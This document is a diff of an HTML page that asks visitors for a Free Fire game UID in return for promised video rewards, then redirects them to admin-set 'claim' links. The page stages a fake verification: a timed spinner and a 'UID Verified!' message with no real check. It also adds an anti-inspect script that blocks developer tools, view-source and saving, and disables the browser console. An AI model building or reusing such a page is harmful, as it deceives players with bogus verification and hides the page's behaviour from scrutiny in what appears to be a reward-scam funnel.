@@ -1,128 +1,442 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Reward Verification</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UID Checker</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <!-- SAFE ANTI-F12 & ANTI-INSPECT SHIELD -->
     <script>
-        document.addEventListener('contextmenu', e => e.preventDefault(), true);
-        window.addEventListener('keydown', e => {
-            if (e.key === 'F12' || ((e.ctrlKey || e.metaKey) && e.shiftKey && ['I','J','C'].includes(e.key.toUpperCase()))) {
-                e.preventDefault();
-            }
-        }, true);
+        (function() {
+            document.addEventListener('contextmenu', e => { e.preventDefault(); return false; }, true);
+            window.addEventListener('keydown', function(e) {
+                if (e.keyCode === 123 || e.key === 'F12') { e.preventDefault(); return false; }
+                if ((e.ctrlKey || e.metaKey) && e.shiftKey && ['I','J','C'].includes(e.key.toUpperCase())) {
+                    e.preventDefault(); return false;
+                }
+                if ((e.ctrlKey || e.metaKey) && ['U','S'].includes(e.key.toUpperCase())) {
+                    e.preventDefault(); return false;
+                }
+            }, true);
+            try {
+                const noop = () => {};
+                ['log', 'debug', 'info', 'warn', 'error'].forEach(m => window.console[m] = noop);
+            } catch(e) {}
+        })();
     </script>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        
         body {
             min-height: 100vh;
-            background: #090a0f;
             display: flex;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             padding: 20px;
-            color: #f8fafc;
+            background: #0f1117;
+            position: relative;
+            overflow: hidden;
+            user-select: none;
         }
-
-        .auth-card {
-            width: 100%;
-            max-width: 400px;
-            background: #131722;
+        
+        .bg-container {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%; z-index: 0; overflow: hidden;
+        }
+        .bg-container img {
+            width: 100%; height: 100%; object-fit: cover; filter: blur(12px) brightness(0.3); transform: scale(1.1);
+        }
+        .bg-container .overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15,17,23,0.6);
+        }
+        
+        .container {
+            position: relative; z-index: 1;
+            background: rgba(26, 28, 35, 0.7);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            padding: 40px 35px;
             border-radius: 24px;
-            padding: 36px 28px;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
-            text-align: center;
-        }
-
-        .badge-icon { font-size: 44px; margin-bottom: 12px; }
-        h2 { font-size: 22px; font-weight: 800; }
-        p.sub { font-size: 13px; color: #94a3b8; margin-bottom: 24px; }
-
-        .input-group input {
+            border: 1px solid rgba(255,255,255,0.08);
+            box-shadow: 0 30px 80px rgba(0,0,0,0.6);
+            max-width: 420px;
             width: 100%;
-            padding: 15px;
-            background: #090a0f;
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            border-radius: 14px;
-            color: #fff;
-            font-size: 18px;
-            font-weight: 700;
             text-align: center;
-            letter-spacing: 2px;
-            outline: none;
-            margin-bottom: 18px;
+            animation: fadeInUp 0.8s ease;
         }
-        .input-group input:focus { border-color: #6366f1; }
-
-        .btn-proceed {
-            width: 100%;
-            padding: 14px;
-            border-radius: 14px;
-            background: linear-gradient(135deg, #6366f1, #8b5cf6);
-            border: none;
-            color: #fff;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: 0.2s;
+        
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px) scale(0.95); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
         }
-        .btn-proceed:active { transform: scale(0.98); }
-
-        .status-box {
+        
+        .logo { font-size: 50px; margin-bottom: 10px; animation: float 3s ease-in-out infinite; }
+        @keyframes float { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
+        
+        .container h2 { color: #e2e8f0; font-size: 22px; font-weight: 700; margin-bottom: 6px; letter-spacing: 0.5px; }
+        .container .sub-title { color: #94a3b8; font-size: 13px; font-weight: 400; margin-bottom: 25px; }
+        
+        .uid-input-wrapper { position: relative; margin-bottom: 15px; }
+        .uid-input-wrapper input {
+            width: 100%; padding: 16px 20px; padding-right: 50px;
+            border: 1px solid #2d3138; border-radius: 12px; font-size: 18px; font-weight: 500;
+            text-align: center; letter-spacing: 3px; background: rgba(15,17,23,0.8); color: #e2e8f0;
+            transition: all 0.3s ease; outline: none;
+        }
+        .uid-input-wrapper input::placeholder { color: #4a4e57; letter-spacing: 1px; font-weight: 400; }
+        .uid-input-wrapper input:focus { border-color: #6366f1; box-shadow: 0 0 0 3px rgba(99,102,241,0.15); background: rgba(15,17,23,1); }
+        .uid-input-wrapper input.error-input {
+            border-color: #ef4444;
+            box-shadow: 0 0 0 3px rgba(239,68,68,0.15);
+            animation: shakeInput 0.5s ease;
+        }
+        @keyframes shakeInput {
+            0%, 100% { transform: translateX(0); }
+            20% { transform: translateX(-10px); }
+            40% { transform: translateX(10px); }
+            60% { transform: translateX(-6px); }
+            80% { transform: translateX(6px); }
+        }
+        .uid-input-wrapper .clear-btn {
+            position: absolute; right: 15px; top: 50%; transform: translateY(-50%);
+            background: none; border: none; color: #4a4e57; font-size: 20px; cursor: pointer; display: none; transition: 0.3s;
+        }
+        .uid-input-wrapper .clear-btn.show { display: block; }
+        .uid-input-wrapper .clear-btn:hover { color: #e2e8f0; }
+        
+        .btn {
+            background: linear-gradient(135deg, #6366f1, #8b5cf6); color: #fff; border: none; padding: 16px;
+            border-radius: 12px; font-size: 18px; font-weight: 600; cursor: pointer; width: 100%; margin-top: 10px;
+            transition: all 0.3s ease; letter-spacing: 0.5px; position: relative; overflow: hidden;
+        }
+        .btn:hover { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(99,102,241,0.3); }
+        .btn:active { transform: scale(0.97); }
+        .btn .ripple {
+            position: absolute; border-radius: 50%; background: rgba(255,255,255,0.3); transform: scale(0);
+            animation: rippleAnim 0.6s linear; pointer-events: none;
+        }
+        @keyframes rippleAnim { to { transform: scale(4); opacity: 0; } }
+        
+        .loading-container { display: none; margin: 30px 0 20px; padding: 20px; }
+        .loading-container.show { display: block; animation: fadeIn 0.4s ease; }
+        .spinner {
+            width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.05); border-top: 3px solid #6366f1;
+            border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-container p { color: #94a3b8; margin-top: 15px; font-size: 14px; font-weight: 400; }
+        
+        .success-popup {
+            display: none; margin: 20px 0; padding: 25px;
+            background: rgba(34,197,94,0.1); border: 1px solid rgba(34,197,94,0.2); border-radius: 16px;
+            animation: popIn 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+        }
+        .success-popup.show { display: block; }
+        @keyframes popIn { 0% { transform: scale(0.5); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+        .success-popup .icon { font-size: 40px; display: block; margin-bottom: 8px; }
+        .success-popup .label { color: #22c55e; font-size: 18px; font-weight: 700; }
+        .success-popup .sub-label { color: #94a3b8; font-size: 13px; font-weight: 400; }
+        
+        .buttons-container { display: none; margin-top: 20px; gap: 12px; animation: fadeIn 0.5s ease; }
+        .buttons-container.show { display: flex; flex-direction: column; }
+        .action-btn {
+            padding: 16px; border: none; border-radius: 12px; font-size: 17px; font-weight: 600; cursor: pointer;
+            transition: all 0.3s ease; width: 100%; color: #fff; letter-spacing: 0.5px; position: relative; overflow: hidden;
+        }
+        .action-btn:active { transform: scale(0.97); }
+        .action-btn.btn-1 { background: linear-gradient(135deg, #22c55e, #16a34a); }
+        .action-btn.btn-1:hover { transform: translateY(-2px); box-shadow: 0 15px 40px rgba(34,197,94,0.3); }
+        .action-btn.btn-2 { background: linear-gradient(135deg, #3b82f6, #2563eb); }
+        .action-btn.btn-2:hover { transform: translateY(-2px); box-shadow: 0 15px 40px rgba(59,130,246,0.3); }
+        .action-btn.tap-effect { animation: tapPulse 0.3s ease; }
+        @keyframes tapPulse { 0% { transform: scale(1); } 50% { transform: scale(0.95); } 100% { transform: scale(1); } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        
+        .custom-alert-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(15,17,23,0.8);
+            backdrop-filter: blur(14px);
+            -webkit-backdrop-filter: blur(14px);
+            z-index: 9999;
             display: none;
-            margin-top: 16px;
-            padding: 12px;
-            border-radius: 12px;
-            font-size: 13px;
-            font-weight: 600;
+            justify-content: center;
+            align-items: center;
+            animation: fadeInOverlay 0.3s ease;
         }
-        .status-box.error { display: block; background: rgba(239, 68, 68, 0.12); color: #f87171; }
-        .status-box.loading { display: block; background: rgba(99, 102, 241, 0.12); color: #818cf8; }
+        .custom-alert-overlay.show { display: flex; }
+        @keyframes fadeInOverlay { from { opacity: 0; } to { opacity: 1; } }
+        
+        .custom-alert-box {
+            background: rgba(26, 28, 35, 0.95);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border-radius: 24px;
+            padding: 34px 30px 30px;
+            max-width: 380px;
+            width: 92%;
+            text-align: center;
+            border: 1px solid rgba(239,68,68,0.2);
+            box-shadow: 0 0 80px rgba(239,68,68,0.05);
+            animation: alertPopIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        @keyframes alertPopIn {
+            from { opacity: 0; transform: scale(0.85) translateY(30px) rotate(-2deg); }
+            to { opacity: 1; transform: scale(1) translateY(0) rotate(0deg); }
+        }
+        
+        .custom-alert-box .alert-icon { font-size: 56px; display: block; margin-bottom: 8px; animation: alertShake 0.6s ease; }
+        @keyframes alertShake {
+            0%, 100% { transform: rotate(0deg) scale(1); }
+            15% { transform: rotate(-15deg) scale(1.1); }
+            30% { transform: rotate(15deg) scale(1.1); }
+            45% { transform: rotate(-10deg) scale(1.05); }
+            60% { transform: rotate(10deg) scale(1.05); }
+            80% { transform: rotate(-5deg) scale(1); }
+        }
+        
+        .custom-alert-box .alert-title { font-size: 24px; font-weight: 800; color: #ef4444; margin-bottom: 6px; }
+        .custom-alert-box .alert-message { font-size: 14px; color: #94a3b8; margin-bottom: 22px; line-height: 1.7; }
+        .custom-alert-box .alert-message strong { color: #ef4444; font-weight: 700; }
+        .custom-alert-box .alert-message .rule { display: inline-block; background: rgba(239,68,68,0.05); padding: 2px 12px; border-radius: 6px; margin: 0 2px; font-weight: 600; color: #ef4444; }
+        
+        .custom-alert-box .alert-btn { padding: 13px 44px; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; background: linear-gradient(135deg, #ef4444, #dc2626); color: #fff; transition: all 0.3s ease; box-shadow: 0 0 40px rgba(239,68,68,0.15); position: relative; overflow: hidden; }
+        .custom-alert-box .alert-btn:hover { transform: translateY(-3px) scale(1.02); }
+        .custom-alert-box .alert-btn:active { transform: scale(0.96); }
+        
+        .error-page { display: none; padding: 20px 0; animation: fadeInUp 0.6s ease; }
+        .error-page.show { display: block; }
+        .error-page .error-icon { font-size: 60px; display: block; margin-bottom: 10px; animation: float 3s ease-in-out infinite; }
+        .error-page .error-title { font-size: 24px; font-weight: 800; color: #e2e8f0; margin-bottom: 6px; }
+        .error-page .error-sub { font-size: 14px; color: #94a3b8; margin-bottom: 20px; }
+        .error-page .error-status { display: inline-block; padding: 6px 20px; border-radius: 20px; font-size: 13px; font-weight: 600; text-transform: uppercase; margin-bottom: 15px; }
+        .error-page .error-status.suspended { background: rgba(245,158,11,0.15); color: #f59e0b; border: 1px solid rgba(245,158,11,0.15); }
+        .error-page .error-status.disabled { background: rgba(239,68,68,0.15); color: #ef4444; border: 1px solid rgba(239,68,68,0.15); }
+        .error-page .error-status.expired { background: rgba(239,68,68,0.15); color: #ef4444; border: 1px solid rgba(239,68,68,0.15); }
+        .error-page .error-status.not_found { background: rgba(148,163,184,0.15); color: #94a3b8; border: 1px solid rgba(148,163,184,0.15); }
+        .error-page .btn-back { padding: 12px 40px; border: none; border-radius: 12px; background: linear-gradient(135deg, #6366f1, #8b5cf6); color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s; margin-top: 10px; }
+        
+        @media (max-width: 480px) {
+            .container { padding: 28px 20px; border-radius: 20px; }
+            .container h2 { font-size: 19px; }
+            .uid-input-wrapper input { font-size: 16px; padding: 14px 16px; padding-right: 45px; }
+            .btn { font-size: 16px; padding: 14px; }
+            .action-btn { font-size: 15px; padding: 14px; }
+            .logo { font-size: 40px; }
+            .custom-alert-box { padding: 24px 18px 22px; }
+            .custom-alert-box .alert-title { font-size: 20px; }
+            .custom-alert-box .alert-icon { font-size: 45px; }
+        }
     </style>
 </head>
 <body>
-    <div class="auth-card">
-        <div class="badge-icon">🎮</div>
-        <h2>Verify Free Fire UID</h2>
-        <p class="sub">Enter your gaming UID to unlock video rewards</p>
-
-        <div class="input-group">
-            <input type="text" id="uidInput" placeholder="Enter UID" maxlength="12" autofocus inputmode="numeric">
+    <div class="bg-container" id="bgContainer">
+        <img id="bgImage" src="" alt="background">
+        <div class="overlay"></div>
+    </div>
+    
+    <div class="container">
+        <div class="logo">🎮</div>
+        <h2>Enter Your UID</h2>
+        <p class="sub-title">Enter your Free Fire UID to continue</p>
+        
+        <div id="normalContent">
+            <div class="uid-input-wrapper">
+                <input type="text" id="uidInput" placeholder="Enter UID" maxlength="12" autofocus inputmode="numeric">
+                <button class="clear-btn" id="clearBtn" onclick="clearInput()">✕</button>
+            </div>
+            <button onclick="checkUID()" class="btn" id="checkBtn">➜ Process</button>
+            
+            <div class="loading-container" id="loadingContainer">
+                <div class="spinner"></div>
+                <p>⏳ Verifying UID...</p>
+            </div>
+            
+            <div class="success-popup" id="successPopup">
+                <span class="icon">✅</span>
+                <div class="label">UID Verified!</div>
+                <div class="sub-label">Redirecting to video page...</div>
+            </div>
+            
+            <div class="buttons-container" id="buttonsContainer">
+                <button class="action-btn btn-1" id="btn1" onclick="handleButtonClick(1)">Watch Video</button>
+                <button class="action-btn btn-2" id="btn2" onclick="handleButtonClick(2)">Get Reward</button>
+            </div>
         </div>
+        
+        <div class="error-page" id="errorPage">
+            <span class="error-icon" id="errorIcon">🚫</span>
+            <div class="error-title" id="errorTitle">Link Suspended</div>
+            <div class="error-sub" id="errorSub">This link has been suspended by the admin</div>
+            <div class="error-status" id="errorStatus">SUSPENDED</div>
+            <br>
+            <button class="btn-back" onclick="goBack()">🔙 Go Back</button>
+        </div>
+    </div>
 
-        <button class="btn-proceed" id="submitBtn" onclick="verifyAndProceed()">Continue ➜</button>
-        <div class="status-box" id="statusMsg"></div>
+    <div class="custom-alert-overlay" id="customAlert">
+        <div class="custom-alert-box">
+            <span class="alert-icon">❌</span>
+            <div class="alert-title">Invalid UID!</div>
+            <div class="alert-message">
+                Please enter a valid <strong>8-12 digit</strong> UID.<br>
+                Only <span class="rule">numbers</span> are allowed.<br>
+                <span style="font-size:12px;color:#4a4e57;">Example: 1234567890</span>
+            </div>
+            <button class="alert-btn" id="alertBtn" onclick="closeAlert()">OK, Got it! ✅</button>
+        </div>
     </div>
 
     <script>
-        const linkParam = new URLSearchParams(window.location.search).get('link') || 'default';
-
-        document.getElementById('uidInput').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') verifyAndProceed();
+        function playTapSound() {
+            try {
+                var audio = new Audio('data:audio/wav;base64,UklGRlAAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoAAACBhYqNk5mdoqGko6CgmZaPioWDeXJsaGZkZGNkZ2ZqaWxucHFycXBvcG9ubm5ub25ubW1tbG1sbGxra2pqaWloZ2ZmZWVkZGNjYmJhYV9fXg==');
+                audio.volume = 0.3;
+                audio.play().catch(function() {});
+            } catch (e) {}
+        }
+        
+        async function loadBackground() {
+            try {
+                var r = await fetch('/api/settings');
+                var data = await r.json();
+                if (data && data.background) {
+                    document.getElementById('bgImage').src = data.background;
+                } else {
+                    document.getElementById('bgImage').style.display = 'none';
+                    document.querySelector('.bg-container').style.background = 'linear-gradient(135deg, #0f1117 0%, #1a1c23 50%, #0f1117 100%)';
+                }
+            } catch (e) {}
+        }
+        
+        function showCustomAlert() {
+            document.getElementById('customAlert').classList.add('show');
+            var input = document.getElementById('uidInput');
+            input.classList.add('error-input');
+            setTimeout(function() { input.classList.remove('error-input'); }, 600);
+            setTimeout(function() { document.getElementById('alertBtn').focus(); }, 300);
+        }
+        
+        function closeAlert() {
+            document.getElementById('customAlert').classList.remove('show');
+            document.getElementById('uidInput').focus();
+            document.getElementById('uidInput').select();
+        }
+        
+        document.getElementById('customAlert').addEventListener('click', function(e) {
+            if (e.target === this) closeAlert();
         });
-
-        function verifyAndProceed() {
-            const uid = document.getElementById('uidInput').value.trim();
-            const status = document.getElementById('statusMsg');
-            const btn = document.getElementById('submitBtn');
-
-            if (!/^\d{8,12}$/.test(uid)) {
-                status.className = 'status-box error';
-                status.textContent = '❌ Please enter a valid 8-12 digit numeric UID';
+        
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') closeAlert();
+        });
+        
+        var linkData = null;
+        
+        async function loadLinkData() {
+            var linkId = new URLSearchParams(window.location.search).get('link');
+            if (linkId) {
+                try {
+                    var r = await fetch('/api/link/' + linkId);
+                    if (r.status === 403) {
+                        var error = await r.json();
+                        showErrorPage(error.status || 'suspended');
+                        return;
+                    }
+                    if (!r.ok) {
+                        showErrorPage('not_found');
+                        return;
+                    }
+                    var data = await r.json();
+                    if (data && data.id) {
+                        linkData = data;
+                        document.getElementById('normalContent').style.display = 'block';
+                        document.getElementById('errorPage').classList.remove('show');
+                    } else {
+                        showErrorPage('not_found');
+                    }
+                } catch (e) {
+                    showErrorPage('not_found');
+                }
+            }
+        }
+        
+        function showErrorPage(status) {
+            document.getElementById('normalContent').style.display = 'none';
+            document.getElementById('errorPage').classList.add('show');
+            var icons = { 'suspended': '⛔', 'disabled': '🚫', 'expired': '⌛', 'not_found': '🔍', 'inactive': '⚠️' };
+            var titles = { 'suspended': 'Link Suspended', 'disabled': 'Link Disabled', 'expired': 'Link Expired', 'not_found': 'Link Not Found', 'inactive': 'Link Inactive' };
+            document.getElementById('errorIcon').textContent = icons[status] || '🚫';
+            document.getElementById('errorTitle').textContent = titles[status] || 'Link Not Available';
+            document.getElementById('errorStatus').textContent = (status || 'UNKNOWN').toUpperCase();
+            document.getElementById('errorStatus').className = 'error-status ' + (status || 'disabled');
+        }
+        
+        function goBack() { window.history.back(); }
+        
+        function checkUID() {
+            var uid = document.getElementById('uidInput').value.trim();
+            if (uid.length < 8 || uid.length > 12 || !/^\d+$/.test(uid)) {
+                playTapSound();
+                showCustomAlert();
                 return;
             }
-
+            playTapSound();
             localStorage.setItem('playerUID', uid);
-            btn.disabled = true;
-            status.className = 'status-box loading';
-            status.textContent = '⏳ Verifying UID... Opening Video Page';
-
-            setTimeout(() => {
-                window.location.href = `/v/${linkParam}`;
-            }, 500);
+            document.getElementById('checkBtn').style.display = 'none';
+            document.getElementById('loadingContainer').classList.add('show');
+            
+            setTimeout(function() {
+                document.getElementById('loadingContainer').classList.remove('show');
+                document.getElementById('successPopup').classList.add('show');
+                setTimeout(function() { redirectToVideoPage(); }, 800);
+            }, 1200);
         }
+        
+        function redirectToVideoPage() {
+            var videoUrl = linkData ? linkData.video : 'https://youtu.be/dQw4w9WgXcQ';
+            var claimUrl = linkData ? linkData.claim : '#';
+            var buttonText = linkData ? linkData.buttonText : 'Claim Now';
+            var headline = linkData ? linkData.headline : '';
+            
+            const videoEncoded = encodeURIComponent(videoUrl);
+            const claimEncoded = encodeURIComponent(claimUrl);
+            const btnEncoded = encodeURIComponent(buttonText);
+            const headlineEncoded = encodeURIComponent(headline);
+            
+            localStorage.setItem('videoUrl', videoUrl);
+            localStorage.setItem('claimUrl', claimUrl);
+            localStorage.setItem('buttonText', buttonText);
+            localStorage.setItem('headline', headline);
+            
+            const linkId = linkData ? linkData.id : 'default';
+            window.location.href = `/v/${linkId}?video=${videoEncoded}&claim=${claimEncoded}&btn=${btnEncoded}&headline=${headlineEncoded}`;
+        }
+        
+        function handleButtonClick(num) {
+            playTapSound();
+            redirectToVideoPage();
+        }
+        
+        function clearInput() {
+            document.getElementById('uidInput').value = '';
+            document.getElementById('clearBtn').classList.remove('show');
+            document.getElementById('uidInput').focus();
+            playTapSound();
+        }
+        
+        document.getElementById('uidInput').addEventListener('input', function() {
+            document.getElementById('clearBtn').classList.toggle('show', this.value.length > 0);
+            this.classList.remove('error-input');
+        });
+        document.getElementById('uidInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') checkUID();
+        });
+        
+        loadBackground();
+        loadLinkData();
     </script>
 </body>
 </html>
